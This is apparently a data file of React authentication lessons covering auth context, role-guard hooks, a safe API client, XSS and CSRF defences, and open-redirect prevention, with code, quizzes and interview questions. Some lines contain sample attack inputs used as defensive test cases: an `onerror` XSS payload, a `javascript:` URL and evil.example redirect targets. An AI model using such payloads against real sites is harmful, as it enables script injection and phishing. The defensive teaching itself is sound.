        { label: "RequireAuth", note: "reads status" , children: [ { label: "Chats" }, { label: "Settings" } ] }
      ]}
    ]}},
    points: [
      "Keep **status** (`checking`/`guest`/`user`) separate from `user`, so guards can wait during the session check.",
      "Restore the session once on mount. Dev Strict Mode runs the effect twice: use an `ignore` flag (or a cached promise if refresh tokens rotate).",
      "Wrap the value in `useMemo` and actions in `useCallback`, so consumers don't re-render on every provider render.",
      "React 19: render `<AuthContext value={...}>` directly; `.Provider` still works but is no longer needed.",
      "Context holds **who** is logged in; tokens stay in the API module, not in React state."
    ],
    code: { file: "AuthProvider.jsx", lang: "jsx", src: `import { createContext, useCallback, useContext, useEffect, useMemo, useState } from 'react';
import * as authApi from './authApi';

const AuthContext = createContext(null);

export function AuthProvider({ children }) {
  const [user, setUser] = useState(null);
  const [status, setStatus] = useState('checking'); // checking | guest | user

  useEffect(() => {
    let ignore = false;
    authApi.restoreSession()                         // GET /me via refresh cookie
      .then((u) => { if (!ignore) { setUser(u); setStatus(u ? 'user' : 'guest'); } })
      .catch(() => { if (!ignore) setStatus('guest'); });
    return () => { ignore = true; };
  }, []);

  const login = useCallback(async (email, password) => {
    const u = await authApi.login(email, password);
    setUser(u);
    setStatus('user');
  }, []);

  const logout = useCallback(async () => {
    try { await authApi.logout(); }
    finally { setUser(null); setStatus('guest'); }
  }, []);

  const value = useMemo(() => ({ user, status, login, logout }), [user, status, login, logout]);

  if (status === 'checking') return <p>Loading your chats…</p>;
  return <AuthContext value={value}>{children}</AuthContext>;
}

export function useAuth() {
  const ctx = useContext(AuthContext);
  if (!ctx) throw new Error('useAuth must be used inside <AuthProvider>');
  return ctx;
}

// main.jsx: <AuthProvider><RouterProvider router={router} /></AuthProvider>`, walk: [
      { lines: [4], note: "Default `null` lets `useAuth` detect a missing provider." },
      { lines: [8], note: "Start in `checking`: we don't know yet if a session exists." },
      { lines: [10, 11, 12, 13, 14, 15, 16], note: "Restore once on mount. `ignore` drops stale results (dev Strict Mode runs this twice)." },
      { lines: [18, 24, 25, 26], note: "`login` sets the user after the API succeeds; `logout` clears it even if the call fails (`finally`)." },
      { lines: [29], note: "Memoise the value so consumers re-render only when auth really changes." },
      { lines: [31, 32], note: "Optional app-wide splash while checking; then provide the value (React 19 syntax)." }
    ]},
    output: "On load: \"Loading your chats…\" briefly, then the app. `Header` shows \"Asha\" and a Log out button; after logout every consumer switches to guest at once.",
    mistakes: [
      { bad: `<AuthContext value={{ user, login, logout }}>`, good: `const value = useMemo(() => ({ user, status, login, logout }), [user, status, login, logout]);\n<AuthContext value={value}>`, why: "A new object every render makes every `useAuth()` consumer re-render, even when nothing changed." },
      { bad: `const [token, setToken] = useState(localStorage.token);\n// token in context + localStorage`, good: `// token in the API module's memory; context holds user + status`, why: "Keeping the token in context and storage spreads it everywhere and invites XSS theft. Components need the user, not the token." }
    ],
    practice: [
      { level: "B", q: "Show the user's name in a header.", a: "`const { user } = useAuth(); return <header>{user ? user.name : 'Guest'}</header>;`" },
      { level: "I", q: "Listen for the `auth:logout` event the refresh interceptor fires.", a: "Add an effect in the provider.", code: `useEffect(() => {\n  const onLogout = () => { setUser(null); setStatus('guest'); };\n  window.addEventListener('auth:logout', onLogout);\n  return () => window.removeEventListener('auth:logout', onLogout);\n}, []);` },
      { level: "I", q: "Add `updateProfile(changes)` that saves and updates the user.", a: "`useCallback(async (c) => { const u = await authApi.updateMe(c); setUser(u); }, [])`, then add it to the memo value." },
      { level: "C", q: "Rewrite the state with `useReducer` (`checking`, `loggedIn`, `loggedOut` actions).", a: "One reducer keeps `user` and `status` changing together, so they can never disagree." }
    ],
    quiz: [
      { q: "Why have a `status` as well as `user`?", options: ["Style only", "`null` user can mean \"guest\" or \"still checking\"", "React needs it"], answer: 1, why: "Guards must wait while checking instead of redirecting." },
      { q: "In React 19, how do you provide a context?", options: ["Only `<Ctx.Provider value>`", "`<Ctx value>` works directly", "`provideContext(Ctx)`"], answer: 1, why: "React 19 lets the context object itself act as the provider." },
      { q: "Why `useMemo` the provider value?", options: ["To persist it across reloads", "To avoid re-rendering all consumers every render", "To encrypt it"], answer: 1, why: "Context compares the value by reference." }
    ],
    rev: {
      sec30: "AuthProvider owns `user`, `status` (checking/guest/user), `login`, `logout`. It restores the session once on mount (ignore flag for Strict Mode), memoises the value, and shares it via context (`<AuthContext value>` in React 19). Tokens stay in the API layer. A `useAuth` hook throws if used outside the provider.",
      interview: [
        { level: "basic", q: "Why put auth in context?", a: "Many components across the tree need the user and login/logout; context avoids passing them through every level." },
        { level: "intermediate", q: "How do you avoid re-render storms from auth context?", a: "Memoise the value and actions; split rarely used parts into another context if needed." },
        { level: "advanced", q: "Should the token live in the auth context?", a: "Usually no. Keep it in the API client's memory; context exposes user and status, so components can't leak the token." },
        { level: "tricky", q: "In dev, the session request fires twice. Bug?", a: "No, Strict Mode runs effects twice in development only. Make it safe with an `ignore` flag or a cached promise." }
      ],
      cheat: [
        "Context value: `{ user, status, login, logout }`",
        "status: checking | guest | user",
        "Restore session once on mount (ignore flag)",
        "`useMemo` value, `useCallback` actions",
        "React 19: `<AuthContext value={v}>`",
        "Tokens stay out of React state",
        "`useAuth` throws outside the provider"
      ]
    },
    related: ["HOOKS-006", "STORE-002", "AUTH-012", "AUTH-006"]
  },

  "AUTH-012": {
    tldr: "Wrap auth logic in custom hooks: **`useAuth`** reads the context safely, **`useRequireRole`** sends users away when they lack a role and tells the page whether to render. Pages stay one line simple.",
    analogy: { icon: "🎧", text: "A music app's \"Premium only\" sticker. Each premium screen just puts the sticker on; the sticker knows how to check your plan and send you to the upgrade page." },
    visual: { type: "layers", title: "Auth hook layers", items: [
      { label: "Pages", detail: "`const { allowed } = useRequireRole('admin')`" },
      { label: "useRequireRole / useCan", detail: "Decide: wait, redirect to login, redirect to 403, or allow." },
      { label: "useAuth", detail: "Reads the context; throws a clear error outside the provider." },
      { label: "AuthContext", detail: "`user`, `status`, `login`, `logout` (AUTH-011)." },
      { label: "API layer", detail: "Tokens, refresh, HTTP calls." }
    ]},
    points: [
      "Hooks hide **how** auth works; pages only say **what** they need.",
      "`useAuth` (AUTH-011) = `useContext(AuthContext)` + a clear error outside the provider. Build the others on top of it.",
      "`useRequireRole` must handle all three states: checking → wait, guest → login, wrong role → 403.",
      "Redirect inside `useEffect` (or render `<Navigate>`); never call `navigate` during render.",
      "Return flags like `{ allowed, checking }`, so the page renders nothing private until allowed.",
      "Hook names must start with `use`, and hooks follow the rules of hooks."
    ],
    code: { file: "useRequireRole.jsx", lang: "jsx", src: `import { useEffect } from 'react';
import { useLocation, useNavigate } from 'react-router';
import { useAuth } from './AuthProvider';

export function useRequireRole(...roles) {
  const { user, status } = useAuth();
  const navigate = useNavigate();
  const location = useLocation();
  const allowed = status === 'user' && roles.includes(user.role);

  useEffect(() => {
    if (status === 'checking') return;               // wait
    if (status === 'guest') {
      navigate('/login', { replace: true, state: { from: location } });
    } else if (!allowed) {
      navigate('/403', { replace: true });
    }
  }, [status, allowed, navigate, location]);

  return { user, allowed, checking: status === 'checking' };
}

// Non-redirecting helper for buttons and menus
export function useHasRole(...roles) {
  const { user } = useAuth();
  return roles.includes(user?.role);
}

// A page using it
export function KitchenOrders() {
  const { allowed, checking } = useRequireRole('staff', 'admin');
  const canRefund = useHasRole('admin');

  if (checking) return <p>Checking access…</p>;
  if (!allowed) return null;                       // redirect in progress

  return (
    <section>
      <h1>Kitchen orders</h1>
      {canRefund && <button>Refund</button>}
    </section>
  );
}`, walk: [
      { lines: [5], note: "Rest parameters: `useRequireRole('staff', 'admin')` reads naturally." },
      { lines: [9], note: "Compute a boolean, so the effect depends on a stable value, not a new array." },
      { lines: [12, 13, 14, 15, 16], note: "Three outcomes: wait, login (remember `from`), or 403." },
      { lines: [20], note: "Give the page what it needs to decide what to render." },
      { lines: [24, 25, 26], note: "A tiny hook for showing/hiding buttons without redirecting." },
      { lines: [34, 35], note: "Render nothing private until access is confirmed." }
    ]},
    output: "Staff open `/kitchen` and see the orders. Customers are sent to `/403`. Guests go to `/login` and come back after logging in. Only admins see Refund.",
    mistakes: [
      { bad: `function useRequireRole(role) {\n  const { user } = useAuth();\n  const navigate = useNavigate();\n  if (user.role !== role) navigate('/403');\n}`, good: `useEffect(() => {\n  if (status !== 'checking' && !allowed) navigate('/403', { replace: true });\n}, [status, allowed, navigate]);`, why: "Navigating during render is a side effect React warns about, and `user` may still be null while checking." },
      { bad: `if (isAdmin) {\n  const perms = useHasRole('admin');\n}`, good: `const isAdminUser = useHasRole('admin');\nif (isAdminUser) { /* ... */ }`, why: "Hooks can't be called conditionally; call them at the top level every render." }
    ],
    practice: [
      { level: "B", q: "Use `useHasRole` to show a Staff badge in the header.", a: "`const isStaff = useHasRole('staff', 'admin'); {isStaff && <span>Staff</span>}`" },
      { level: "I", q: "Write `useCan(action, item)` on top of `can()` from AUTH-008.", a: "Read the user and call the pure helper.", code: `export function useCan(action, item) {\n  const { user } = useAuth();\n  return can(user, action, item);\n}` },
      { level: "I", q: "Test `useRequireRole` with React Testing Library.", a: "Render a test component inside a fake `AuthContext` value and a `MemoryRouter`; assert the 403 route renders for the wrong role." },
      { level: "C", q: "Turn the hook into a component guard `<RequireRole allow>` instead. When is each better?", a: "Component guards wrap route groups declaratively; the hook suits a single page that also needs `user` or extra checks." }
    ],
    quiz: [
      { q: "Where should `useRequireRole` call `navigate`?", options: ["Directly in the hook body", "Inside `useEffect`", "In the return value"], answer: 1, why: "Navigation is a side effect; run it after render." },
      { q: "What should the hook do while status is `checking`?", options: ["Redirect to login", "Wait and report `checking: true`", "Throw an error"], answer: 1, why: "The session might still be valid." },
      { q: "Why does `useAuth` throw outside the provider?", options: ["To crash production", "To give a clear error instead of `undefined` bugs", "React requires it"], answer: 1, why: "Fail fast with a helpful message." }
    ],
    rev: {
      sec30: "`useAuth` reads auth context and throws outside its provider. `useRequireRole(...roles)` computes `allowed`, waits while checking, and in an effect redirects guests to login (with `from`) and wrong roles to 403, returning `{ allowed, checking, user }`. `useHasRole` is the non-redirecting version for UI bits.",
      interview: [
        { level: "basic", q: "Why make a `useAuth` hook instead of `useContext(AuthContext)` everywhere?", a: "One import, a clear error outside the provider, and you can change the implementation later." },
        { level: "intermediate", q: "What states must `useRequireRole` handle?", a: "Checking (wait), guest (login with return path), logged in without role (403), allowed (render)." },
        { level: "advanced", q: "Why compute `allowed` before the effect?", a: "`...roles` is a new array every render; depending on a boolean keeps the effect from re-running needlessly." },
        { level: "tricky", q: "The page flashes private content before redirecting. Why?", a: "It rendered before the effect ran. Return `null` (or a spinner) unless `allowed` is true." }
      ],
      cheat: [
        "`useAuth()` = safe context read",
        "`useRequireRole('staff','admin')` → `{ allowed, checking }`",
        "Redirect in `useEffect`, never during render",
        "checking → wait; guest → login; wrong role → 403",
        "Render nothing private until `allowed`",
        "`useHasRole` for buttons, no redirect"
      ]
    },
    related: ["HOOKS-029", "HOOKS-022", "AUTH-011", "AUTH-007"]
  },

  "AUTH-013": {
    tldr: "Send credentials only over **HTTPS**, only to **your own API**, through **one** API client. Send just what the user chose (item ids, quantities), and let the server work out prices, owners and rights. The client is never trusted.",
    analogy: { icon: "🧾", text: "At a self-checkout, you scan items, but the till looks up the prices. If you could type your own prices, everyone would pay £1. The shop also only takes your card at its own till, not a stranger's." },
    visual: { type: "layers", title: "Defence lines for an API call", items: [
      { label: "React UI", detail: "Collects intent: `{ productId, qty }`. Hides what the user can't do." },
      { label: "API client", detail: "One place adds the token, only for your API origin, over HTTPS." },
      { label: "Network", detail: "HTTPS only. CORS allows your site's origin with credentials." },
      { label: "Server checks", detail: "Verify token, role, ownership; validate input; compute prices." },
      { label: "Database", detail: "Source of truth: prices, stock, who owns what." }
    ]},
    points: [
      "Everything in the browser can be read and changed: JS bundle, requests, `VITE_` env vars. **Never put secrets there.**",
      "Attach tokens in **one** API client, and only when the URL's origin is your API (don't leak them to third-party URLs).",
      "Send **ids, not facts**: `{ productId, qty }`, never `{ price, userId, isAdmin }`. The server derives those.",
      "Treat 401/403 from the server as the real answer; the UI check was only a hint.",
      "Like ASP.NET Core model binding: never bind `IsAdmin` from the request body (over-posting)."
    ],
    code: { file: "apiClient.js", lang: "js", src: `// Public config, not a secret: e.g. https://api.myshop.com
const API = new URL(import.meta.env.VITE_API_ORIGIN);
let accessToken = null;
export const setAccessToken = (t) => { accessToken = t; };

export async function apiFetch(path, { body, ...options } = {}) {
  const url = new URL(path, API);
  if (url.origin !== API.origin) {
    throw new Error('Refusing to send credentials to ' + url.origin);
  }

  const res = await fetch(url, {
    ...options,
    credentials: 'include',
    headers: {
      'Content-Type': 'application/json',
      ...(accessToken && { Authorization: \`Bearer \${accessToken}\` }),
      ...options.headers,
    },
    body: body && JSON.stringify(body),
  });

  if (res.status === 401) throw new Error('SESSION_EXPIRED');
  if (res.status === 403) throw new Error('FORBIDDEN');
  if (!res.ok) throw new Error(\`HTTP \${res.status}\`);
  return res.status === 204 ? null : res.json();
}

// ✅ Send intent; the server looks up prices and the user from the token
export const placeOrder = (items) =>
  apiFetch('/orders', { method: 'POST', body: { items } }); // [{ productId, qty }]

// ❌ Never trust these from the client:
// body: { items, total: 1.00, userId: 99, role: 'admin' }`, walk: [
      { lines: [2], note: "The API address is public config. Real secrets (DB passwords, signing keys) never go in `VITE_` vars." },
      { lines: [7, 8, 9, 10], note: "Only attach credentials when the request goes to **your** API origin." },
      { lines: [14, 17], note: "One place adds cookies and the Bearer token, so no component handles tokens." },
      { lines: [23, 24, 25], note: "Turn auth failures into clear errors the app can react to (login vs no access)." },
      { lines: [30, 31], note: "Send only ids and quantities; the server computes the total and knows the user." }
    ]},
    output: "`placeOrder([{ productId: 'p1', qty: 2 }])` → `POST https://api.myshop.com/orders` with the Bearer header. `apiFetch('https://evil.example/x')` throws before sending anything.",
    mistakes: [
      { bad: `const STRIPE_SECRET = import.meta.env.VITE_STRIPE_SECRET;`, good: `// Secret key stays on the server.\n// Client only uses the publishable key.`, why: "Vite inlines every `VITE_` variable into the public bundle. Anyone can read it in DevTools." },
      { bad: `apiFetch('/orders', { method: 'POST', body: { items, total, userId: user.id } });`, good: `apiFetch('/orders', { method: 'POST', body: { items } });`, why: "Users can edit request bodies. The server takes the user from the token and the price from the database." }
    ],
    practice: [
      { level: "B", q: "Which of these may live in a `VITE_` variable: API URL, Google Maps browser key, database password?", a: "API URL and a **restricted** browser key are fine (public by design). The database password never." },
      { level: "I", q: "Make the client redirect to login on `SESSION_EXPIRED` globally.", a: "Catch it in one place (TanStack Query `QueryCache` `onError`, or the client) and fire `auth:logout`." },
      { level: "I", q: "Add a request timeout so hanging calls don't spin forever.", a: "Pass `signal: AbortSignal.timeout(10000)` into `fetch` options." },
      { level: "C", q: "You need a third-party API that requires a secret key. How do you call it from React?", a: "Through your own backend (a proxy/BFF endpoint) that adds the secret server-side and checks the user's rights." }
    ],
    quiz: [
      { q: "Is a value in `import.meta.env.VITE_*` secret?", options: ["Yes, Vite encrypts it", "No, it's in the public bundle", "Only in production"], answer: 1, why: "Vite replaces it with the literal string at build time." },
      { q: "What should an \"add to cart\" request send?", options: ["`{ productId, qty, price }`", "`{ productId, qty }`", "`{ productId, qty, userId }`"], answer: 1, why: "Price and user come from the server's own data and the token." },
      { q: "Why check `url.origin` before attaching the token?", options: ["Performance", "So the token isn't sent to other sites", "CORS requires it"], answer: 1, why: "A token sent to a third party can be reused by them." }
    ],
    rev: {
      sec30: "Use HTTPS and one API client that adds credentials only for your API origin. The browser is fully visible to users: no secrets in the bundle or `VITE_` vars. Send intent (ids, quantities), not facts (price, userId, role). The server authenticates, authorizes, validates and computes everything; 401/403 are the real verdicts.",
      interview: [
        { level: "basic", q: "Why can't the client be trusted?", a: "Users control the browser: they can edit JS, state and requests with DevTools or call the API with curl." },
        { level: "intermediate", q: "How do you keep a third-party secret key out of React?", a: "Call your own backend endpoint, which holds the key and calls the third party." },
        { level: "advanced", q: "What is over-posting/mass assignment and how does the UI relate?", a: "The server binds extra fields like `role` from the body. The client can't prevent it; the server must allow-list fields. The UI should only send what's needed." },
        { level: "tricky", q: "Token attached by an interceptor to every URL: problem?", a: "Calls to analytics or image CDNs would carry the user's token. Attach it only for your API origin." }
      ],
      scenario: [
        { q: "A tester changes `price` in the checkout request and pays £0.01.", a: "The server trusted the client's price. Send only product ids and quantities; compute totals from the database." }
      ],
      cheat: [
        "HTTPS only; one API client",
        "Attach tokens only to your API origin",
        "`VITE_` vars are public: no secrets",
        "Send ids and intent, not prices or roles",
        "Server: authn, authz, validation, totals",
        "401 = log in again, 403 = no access",
        "Third-party secrets go through your backend"
      ]
    },
    related: ["API-021", "SEC-011", "SEC-010", "AUTH-014"]
  },

  "AUTH-014": {
    tldr: "**XSS** (cross-site scripting) runs attacker code *inside* your page: it reads localStorage tokens and acts as the user. **CSRF** (cross-site request forgery) makes the browser send your **cookies** from another site. Token storage decides which bites harder.",
    analogy: { icon: "📮", text: "XSS is a stranger sneaking into your flat and using your phone. CSRF is a stranger mailing a letter that your postman delivers with your return address, because he stamps every letter going to your bank." },
    visual: { type: "compare", title: "Two threats, two defences",
      left: { label: "XSS (code in your page)", tone: "bad", points: [
        "Cause: untrusted HTML/JS rendered, e.g. `dangerouslySetInnerHTML`",
        "Can read localStorage tokens and send them away",
        "Can call your API as the user, even with httpOnly cookies",
        "Defend: React escaping, sanitize HTML, CSP, audit packages"
      ]},
      right: { label: "CSRF (request from another site)", tone: "bad", points: [
        "Cause: browser auto-attaches cookies to your API",
        "Evil site submits a form to `shop.com/api/transfer`",
        "Can't read the response, but the action happens",
        "Defend: `SameSite`, CSRF token header, check `Origin`"
      ]}
    },
    points: [
      "**Bearer token in a header** (memory/localStorage): no CSRF (browsers don't add headers for other sites), but **XSS** can steal it from storage.",
      "**httpOnly cookie**: XSS can't steal it, but **CSRF** is possible, so add `SameSite=Lax/Strict` and a CSRF token for state changes.",
      "No storage survives a full XSS: it can still act in the open tab. Preventing XSS comes first.",
      "React escapes `{text}` automatically. The risks are `dangerouslySetInnerHTML`, `href={userUrl}` with `javascript:`, and third-party scripts.",
      "Never change data with GET requests; CSRF defences assume only POST/PUT/DELETE change things."
    ],
    code: { file: "safeRequests.jsx", lang: "jsx", src: `// Cookie session + CSRF token (double-submit pattern)
// Server sets: session=...; HttpOnly; Secure; SameSite=Lax
//              csrf_token=r4nd0m; Secure; SameSite=Lax   (readable by JS)
function readCookie(name) {
  const row = document.cookie.split('; ').find((c) => c.startsWith(name + '='));
  return row && decodeURIComponent(row.split('=')[1]);
}

export function postComment(text) {
  return fetch('/api/comments', {
    method: 'POST',
    credentials: 'include',                       // sends the httpOnly session
    headers: {
      'Content-Type': 'application/json',
      'X-CSRF-Token': readCookie('csrf_token'),   // other sites can't read this
    },
    body: JSON.stringify({ text }),
  });
}

// XSS defence: let React escape user content
export function Comment({ text, website }) {
  const safeUrl = /^https?:\\/\\//i.test(website) ? website : undefined;
  return (
    <p>
      {text}                                       {/* ✅ escaped as text */}
      {safeUrl && <a href={safeUrl}>site</a>}      {/* ✅ blocks javascript: */}
    </p>
  );
  // ❌ <p dangerouslySetInnerHTML={{ __html: text }} />
}`, walk: [
      { lines: [2, 3], note: "Session cookie is httpOnly (XSS can't read). The CSRF cookie is readable on purpose." },
      { lines: [12], note: "Cookies ride along automatically; that's what CSRF abuses." },
      { lines: [15], note: "Copy the CSRF value into a header. Another site can't read your cookies, so it can't do this." },
      { lines: [23], note: "Only allow `http(s)` links; `javascript:` URLs would run code when clicked." },
      { lines: [26], note: "`{text}` is rendered as text, so `<script>` shows up as characters, not code." }
    ]},
    output: "A comment `<img src=x onerror=alert(1)>` shows as plain text. A forged POST from `evil.example` lacks `X-CSRF-Token` (and the SameSite cookie) and gets 403.",
    mistakes: [
      { bad: `<div dangerouslySetInnerHTML={{ __html: comment.body }} />`, good: `import DOMPurify from 'dompurify';\n<div dangerouslySetInnerHTML={{ __html: DOMPurify.sanitize(comment.body) }} />`, why: "Raw user HTML can contain scripts and event handlers. Render as text, or sanitize first." },
      { bad: `// Cookie auth, no SameSite, no CSRF token\nfetch('/api/delete-account', { method: 'POST', credentials: 'include' })`, good: `// Set-Cookie: session=...; HttpOnly; Secure; SameSite=Lax\n// + X-CSRF-Token header checked by the server`, why: "Without SameSite or a CSRF token, any site can trigger this POST with the user's cookie." }
    ],
    practice: [
      { level: "B", q: "Which is safe: `<p>{bio}</p>` or `<p dangerouslySetInnerHTML={{ __html: bio }} />`?", a: "`<p>{bio}</p>`. React escapes it. The second runs any HTML in `bio`." },
      { level: "I", q: "Your app stores a JWT in localStorage. Which threat matters most?", a: "XSS: any injected script can read and exfiltrate it. CSRF isn't an issue because the token is sent in a header you add." },
      { level: "I", q: "Add the CSRF header to every mutating request in an axios instance.", a: "Use a request interceptor.", code: `api.interceptors.request.use((config) => {\n  if (config.method !== 'get') config.headers['X-CSRF-Token'] = readCookie('csrf_token');\n  return config;\n});` },
      { level: "C", q: "Does `SameSite=Lax` alone stop all CSRF?", a: "Mostly for POST, but Lax still sends cookies on top-level GET navigations, so GETs must never change data; a CSRF token covers older browsers and edge cases." }
    ],
    quiz: [
      { q: "With a Bearer token in the `Authorization` header, which attack is mostly not a problem?", options: ["XSS", "CSRF", "Both are prevented"], answer: 1, why: "Other sites can't make the browser add your header; but XSS can still steal the token." },
      { q: "What does an httpOnly cookie protect against?", options: ["CSRF", "Scripts reading the cookie (token theft via XSS)", "All XSS damage"], answer: 1, why: "It blocks reading, not the attacker using the session from your page." },
      { q: "Which React code can cause XSS?", options: ["`<p>{userText}</p>`", "`dangerouslySetInnerHTML` with user HTML", "`useState(userText)`"], answer: 1, why: "It bypasses React's escaping." }
    ],
    rev: {
      sec30: "XSS = attacker code runs in your page (steals localStorage tokens, acts as the user). CSRF = another site makes the browser send your cookies. Header tokens avoid CSRF but are stealable via XSS; httpOnly cookies resist theft but need SameSite + CSRF tokens. React escapes text; watch `dangerouslySetInnerHTML`, `javascript:` URLs and third-party scripts. Use a CSP.",
      interview: [
        { level: "basic", q: "XSS vs CSRF in one line each?", a: "XSS: injected script runs inside your site. CSRF: another site causes the browser to send an authenticated request to yours." },
        { level: "intermediate", q: "How does token storage change your risk?", a: "localStorage/header tokens: XSS theft, no CSRF. httpOnly cookies: no theft by JS, but CSRF needs SameSite and CSRF tokens." },
        { level: "advanced", q: "How do you defend against CSRF with cookie auth?", a: "`SameSite=Lax` or `Strict`, a CSRF token in a custom header the server checks, checking the `Origin` header, and never changing data via GET." },
        { level: "tricky", q: "Does React fully prevent XSS?", a: "No. It escapes text in JSX, but `dangerouslySetInnerHTML`, `javascript:` hrefs, unsafe third-party scripts and server-rendered HTML can still inject code." }
      ],
      compare: { cols: ["", "Header token (memory/localStorage)", "httpOnly cookie"], rows: [
        ["XSS can steal it", "Yes (localStorage)", "No"],
        ["XSS can use it in-page", "Yes", "Yes"],
        ["CSRF risk", "No", "Yes: SameSite + CSRF token"],
        ["Sent automatically", "No", "Yes"]
      ]},
      cheat: [
        "XSS = bad code inside your page",
        "CSRF = other site uses your cookies",
        "Header token: no CSRF, XSS can steal from storage",
        "httpOnly cookie: no theft, add SameSite + CSRF token",
        "React escapes `{text}`; avoid raw `dangerouslySetInnerHTML`",
        "Only allow `http(s)` URLs in `href`",
        "GET must never change data"
      ]
    },
    related: ["SEC-001", "SEC-002", "SEC-004", "AUTH-005"]
  },

  "AUTH-015": {
    tldr: "Most SPA auth bugs are the same few: trusting the client, long-lived tokens in localStorage, **open redirects** after login, secrets in the bundle, leaky logout and chatty error messages. Know the list; check each one.",
    analogy: { icon: "🍕", text: "A pizza shop that loses money the same ways every time: letting customers set their own price, leaving the till key on the counter, and handing orders to whoever says a name. Fix the usual holes first." },
    visual: { type: "compare", title: "Usual holes → fixes",
      left: { label: "Common mistakes", tone: "bad", points: [
        "Hiding admin buttons is the only protection",
        "Long-lived JWT in localStorage",
        "`navigate(searchParams.get('from'))` unchecked",
        "Secret keys in `VITE_` variables",
        "Logout only clears React state"
      ]},
      right: { label: "Fixes", tone: "good", points: [
        "Server checks every request (401/403)",
        "Short token in memory + httpOnly refresh cookie",
        "Allow same-origin paths only (`safeRedirect`)",
        "Secrets stay on the server / BFF",
        "Revoke on server, clear caches, sync tabs"
      ]}
    },
    points: [
      "**Open redirect**: `/login?from=https://evil.example` sends users to a fake site after a real login. Allow only same-origin paths.",
      "**Tokens in URLs** (`?token=…`) leak via history, logs and the `Referer` header. Use headers or cookies.",
      "**User enumeration**: different messages for \"no such email\" vs \"wrong password\". Use one message and rate limits.",
      "**Logging tokens**: `console.log(token)` and error trackers capture them. Scrub auth headers.",
      "**Decode ≠ verify**: never grant access from claims the client decoded; and no `alg: none` tokens on the server."
    ],
    code: { file: "safeRedirect.js", lang: "js", src: `// Only allow redirects to paths on THIS site
export function safeRedirect(target, fallback = '/') {
  if (!target) return fallback;
  try {
    const url = new URL(target, window.location.origin);
    if (url.origin !== window.location.origin) return fallback;
    return url.pathname + url.search + url.hash;
  } catch {
    return fallback;
  }
}

// In the login page, after a successful login:
// const [params] = useSearchParams();
// navigate(safeRedirect(params.get('from'), '/orders'), { replace: true });

safeRedirect('/orders?page=2');            // '/orders?page=2'  ✅
safeRedirect('https://evil.example/login'); // '/'               blocked
safeRedirect('//evil.example');             // '/'               blocked
safeRedirect('javascript:alert(1)');        // '/'               blocked`, walk: [
      { lines: [5], note: "Resolve the target against our own origin, the way the browser would." },
      { lines: [6], note: "Any other origin (including protocol-relative `//evil`) is rejected." },
      { lines: [7], note: "Return only the path part, so even same-origin results can't switch host." },
      { lines: [8, 9], note: "Malformed input falls back safely instead of throwing." },
      { lines: [17, 18, 19, 20], note: "Typical attacks all fall back to `/`." }
    ]},
    output: "`'/orders?page=2'`, then `'/'` three times: only same-site paths survive.",
    mistakes: [
      { bad: `navigate(params.get('from'));\n// or: window.location.href = params.get('from');`, good: `navigate(safeRedirect(params.get('from'), '/orders'), { replace: true });`, why: "Attackers send a real login link with `from` pointing at a lookalike phishing page." },
      { bad: `fetch(\`/api/orders?token=\${token}\`)`, good: `fetch('/api/orders', { headers: { Authorization: \`Bearer \${token}\` } })`, why: "URLs end up in browser history, server logs, proxies and Referer headers." },
      { bad: `Sentry.captureException(err, { extra: { headers: config.headers } });`, good: `const { Authorization, ...safeHeaders } = config.headers;\nSentry.captureException(err, { extra: { headers: safeHeaders } });`, why: "Error trackers store whatever you send, so tokens in logs become a second leak." }
    ],
    practice: [
      { level: "B", q: "Spot the bug: `<a href={\"/reset?token=\" + token}>`.", a: "Token in a URL; it leaks via history and Referer. Reset tokens should be one-time, short-lived, and cleared from the URL after use." },
      { level: "I", q: "Write a Vitest test for `safeRedirect`.", a: "Table-test good and bad inputs.", code: `test.each([\n  ['/cart', '/cart'],\n  ['https://evil.example', '/'],\n  ['//evil.example', '/'],\n])('safeRedirect(%s) -> %s', (input, out) => {\n  expect(safeRedirect(input)).toBe(out);\n});` },
      { level: "I", q: "List 3 places user data can survive logout.", a: "TanStack Query/RTK cache, Zustand/Redux stores, localStorage/sessionStorage drafts (and other open tabs)." },
      { level: "C", q: "Build a quick auth review checklist for a PR.", a: "Server enforces authz? Tokens out of localStorage/URLs/logs? Redirects checked? No secrets in `VITE_`? Logout clears server + caches? Errors don't enumerate users? Rate limits?" }
    ],
    quiz: [
      { q: "What is an open redirect?", options: ["A route without a guard", "Redirecting to any URL taken from user input", "A 301 status"], answer: 1, why: "Attackers use it to bounce users from your real site to a fake one." },
      { q: "Why not pass tokens in query strings?", options: ["URLs have a length limit", "They leak via history, logs and Referer", "Browsers block it"], answer: 1, why: "URLs are copied and stored in many places." },
      { q: "`safeRedirect('//evil.example')` should return…", options: ["`//evil.example`", "The fallback", "`/evil.example`"], answer: 1, why: "`//host` is a protocol-relative URL to another site." }
    ],
    rev: {
      sec30: "The usual SPA auth holes: client-only authorization, long-lived tokens in localStorage, open redirects via `?from=`, tokens in URLs or logs, secrets in `VITE_` vars, incomplete logout, user enumeration, and trusting decoded claims. Fixes: server checks, memory + httpOnly cookies, `safeRedirect`, headers not URLs, scrubbed logs, full logout, generic errors + rate limits.",
      interview: [
        { level: "basic", q: "Name three common auth mistakes in React apps.", a: "Relying on hidden UI for security, storing long-lived tokens in localStorage, and putting secrets in the client bundle." },
        { level: "intermediate", q: "How do you prevent open redirects after login?", a: "Resolve the `from` value against your origin and only accept same-origin paths; otherwise use a default page." },
        { level: "advanced", q: "Why are tokens in URLs dangerous even over HTTPS?", a: "HTTPS protects the wire, but URLs are stored in history, server/proxy logs, analytics and sent in Referer headers." },
        { level: "tricky", q: "The app decodes the JWT and shows admin pages when `role === 'admin'`. Vulnerable?", a: "The pages are just UI, so only if admin **data** isn't protected by the API. If the API verifies the signature and role, a forged token only shows empty screens." }
      ],
      debug: [
        { code: `const from = params.get('from') || '/';\nnavigate(from);`, fix: `const from = safeRedirect(params.get('from'), '/');\nnavigate(from, { replace: true });`, why: "Unchecked redirect targets let attackers send users to any site." }
      ],
      cheat: [
        "Server enforces; UI only hides",
        "No long-lived tokens in localStorage",
        "Validate `from` with `safeRedirect`",
        "No tokens in URLs or logs",
        "No secrets in `VITE_` vars",
        "One generic login error + rate limits",
        "Logout: server revoke + clear caches + tabs",
        "Decoding a JWT is not verifying it"
      ]
    },
    related: ["SEC-013", "SEC-007", "AUTH-014", "AUTH-013"]
  }
};
